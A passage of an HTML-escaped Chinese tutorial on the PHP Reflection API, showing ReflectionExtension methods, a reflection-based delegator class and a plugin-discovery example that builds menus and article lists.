getVersion()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得该扩展的版本&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public ReflectionFunction[] getFunctions()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得该扩展的所有函数&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public array getConstants()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得该扩展的所有常量&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public array getINIEntries()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得与该扩展相关的，在php.ini中的指令信息&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public ReflectionClass[] getClasses()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public array getClassNames()&lt;/div&gt;\r\n&lt;div&gt;}&lt;/div&gt;\r\n&lt;div&gt;?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;4。附：&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;其实从第二点API概览可以看出：接口挺好用的。&lt;/div&gt;\r\n&lt;div&gt;一方面Reflector接口为Reflection小系统提供了一个很好的接口命名规范，&lt;/div&gt;\r\n&lt;div&gt;每个实现他的类都须按他的规范，从外部看来，这个小系统API很统一。&lt;/div&gt;\r\n&lt;div&gt;另一方面由于很多类实现了Reflector接口，&lt;/div&gt;\r\n&lt;div&gt;在这样的类层次结构中，若想实现多态是很容易的。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;演示用代码如下所示：&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php&lt;/div&gt;\r\n&lt;div&gt;class ClassOne {&lt;/div&gt;\r\n&lt;div&gt;function callClassOne() {&lt;/div&gt;\r\n&lt;div&gt;print &quot;In Class One&quot;;&lt;/div&gt;\r\n&lt;div&gt;}&lt;/div&gt;\r\n&lt;div&gt;}&lt;/div&gt;\r\n&lt;div&gt;class ClassOneDelegator {&lt;/div&gt;\r\n&lt;div&gt;private $targets;&lt;/div&gt;\r\n&lt;div&gt;function __construct() {&lt;/div&gt;\r\n&lt;div&gt;$this-&amp;gt;target[] = new ClassOne();&lt;/div&gt;\r\n&lt;div&gt;}&lt;/div&gt;\r\n&lt;div&gt;function __call($name, $args) {&lt;/div&gt;\r\n&lt;div&gt;foreach ($this-&amp;gt;target as $obj) {&lt;/div&gt;\r\n&lt;div&gt;$r = new ReflectionClass($obj);&lt;/div&gt;\r\n&lt;div&gt;if ($method = $r-&amp;gt;getMethod($name)) {&lt;/div&gt;\r\n&lt;div&gt;if ($method-&amp;gt;isPublic() &amp;amp;&amp;amp; !$method-&amp;gt;isAbstract()) {&lt;/div&gt;\r\n&lt;div&gt;return $method-&amp;gt;invoke($obj, $args);&lt;/div&gt;\r\n&lt;div&gt;}&lt;/div&gt;\r\n&lt;div&gt;}&lt;/div&gt;\r\n&lt;div&gt;}&lt;/div&gt;\r\n&lt;div&gt;}&lt;/div&gt;\r\n&lt;div&gt;}&lt;/div&gt;\r\n&lt;div&gt;$obj = new ClassOneDelegator();&lt;/div&gt;\r\n&lt;div&gt;$obj-&amp;gt;callClassOne();&lt;/div&gt;\r\n&lt;div&gt;?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;输出结果：&lt;/div&gt;\r\n&lt;div&gt;In Class One&lt;/div&gt;\r\n&lt;div&gt;可见，通过代理类ClassOneDelegator来代替ClassOne类来实现他的方法。&lt;/div&gt;\r\n&lt;div&gt;同样的，如下的代码也是能够运行的：&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php&lt;/div&gt;\r\n&lt;div&gt;class ClassOne {&lt;/div&gt;\r\n&lt;div&gt;function callClassOne() {&lt;/div&gt;\r\n&lt;div&gt;print &quot;In Class One&quot;;&lt;/div&gt;\r\n&lt;div&gt;}&lt;/div&gt;\r\n&lt;div&gt;}&lt;/div&gt;\r\n&lt;div&gt;class ClassOneDelegator {&lt;/div&gt;\r\n&lt;div&gt;private $targets;&lt;/div&gt;\r\n&lt;div&gt;function addObject($obj) {&lt;/div&gt;\r\n&lt;div&gt;$this-&amp;gt;target[] = $obj;&lt;/div&gt;\r\n&lt;div&gt;}&lt;/div&gt;\r\n&lt;div&gt;function __call($name, $args) {&lt;/div&gt;\r\n&lt;div&gt;foreach ($this-&amp;gt;target as $obj) {&lt;/div&gt;\r\n&lt;div&gt;$r = new ReflectionClass($obj);&lt;/div&gt;\r\n&lt;div&gt;if ($method = $r-&amp;gt;getMethod($name)) {&lt;/div&gt;\r\n&lt;div&gt;if ($method-&amp;gt;isPublic() &amp;amp;&amp;amp; !$method-&amp;gt;isAbstract()) {&lt;/div&gt;\r\n&lt;div&gt;return $method-&amp;gt;invoke($obj, $args);&lt;/div&gt;\r\n&lt;div&gt;}&lt;/div&gt;\r\n&lt;div&gt;}&lt;/div&gt;\r\n&lt;div&gt;}&lt;/div&gt;\r\n&lt;div&gt;}&lt;/div&gt;\r\n&lt;div&gt;}&lt;/div&gt;\r\n&lt;div&gt;$obj = new ClassOneDelegator();&lt;/div&gt;\r\n&lt;div&gt;$obj-&amp;gt;addObject(new ClassOne());&lt;/div&gt;\r\n&lt;div&gt;$obj-&amp;gt;callClassOne();&lt;/div&gt;\r\n&lt;div&gt;?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;PHP反射API--利用反射技术实现的插件系统架构&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;http://www.e897.com/Article/wlbc/php/200908/5377.html&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; 1. /**&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; 2. * @name &amp;nbsp; &amp;nbsp;PHP反射API--利用反射技术实现的插件系统架构&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; 3. * @author :PHPCQ.COM&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; 4. */ &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; 5. interface Iplugin{ &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; 6. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; public static function getName(); &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; 7. } &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; 8. function findPlugins(){ &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; 9. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; $plugins = array(); &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;10. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; foreach (get_declared_classes() as $class){ &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;11. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; $reflectionClass = new ReflectionClass($class); &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;12. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; if ($reflectionClass-&amp;gt;implementsInterface(''Iplugin'')) { &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;13. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; $plugins[] = $reflectionClass; &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;14. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; } &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;15. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; } &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;16. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; return $plugins; &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;17. } &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;18. function computeMenu(){ &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;19. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; $menu = array(); &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;20. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; foreach (findPlugins() as $plugin){ &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;21. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; if ($plugin-&amp;gt;hasMethod(''getMenuItems'')) { &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;22. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; $reflectionMethod = $plugin-&amp;gt;getMethod(''getMenuItems''); &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;23. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; if ($reflectionMethod-&amp;gt;isStatic()) { &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;24. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; $items = $reflectionMethod-&amp;gt;invoke(null); &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;25. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; } else { &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;26. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; $pluginInstance = $plugin-&amp;gt;newInstance(); &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;27. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; $items = $reflectionMethod-&amp;gt;invoke($pluginInstance); &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;28. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; } &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;29. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; $menu = array_merge($menu,$items); &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;30. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; } &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;31. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; } &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;32. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; return $menu; &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;33. } &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;34. function computeArticles(){ &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;35. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; $articles = array(); &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;36. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; foreach (findPlugins() as $plugin){ &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;37. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; if ($plugin-&amp;gt;hasMethod(''getArticles'')) { &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;38. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; $reflectionMethod = $plugin-&amp;gt;getMethod(''getArticles''); &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;39. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; if ($reflectionMethod-&amp;gt;isStatic()) { &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;40. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; $items = $reflectionMethod-&amp;gt;invoke(null); &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;41. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; } else { &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;42. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; $pluginInstance = $plugin-&amp;gt;newInstance(); &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;43. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; $items = $reflectionMethod-&amp;gt;invoke($pluginInstance); &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;44. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; } &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;45. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; $articles = array_merge($articles,$items); &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;46. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; } &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;47. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; } &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;48. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; return $articles; &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;49. } &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;50. require_once(''plugin.php''); &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;51. $menu = computeMenu(); &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;52. $articles &amp;nbsp; &amp;nbsp;= computeArticles(); &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;53. print_r($menu); &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;54. print_r($articles); &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;55. &amp;nbsp; &amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;56. &amp;nbsp; &amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;57. //plugin.php 代码如下 &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;58. &amp;lt;?php &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;59. class MycoolPugin implements Iplugin { &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;60. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; public static function getName(){ &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;61. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; return ''MycoolPlugin''; &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;62. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; } &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;63. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; public static function getMenuItems(){ &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; 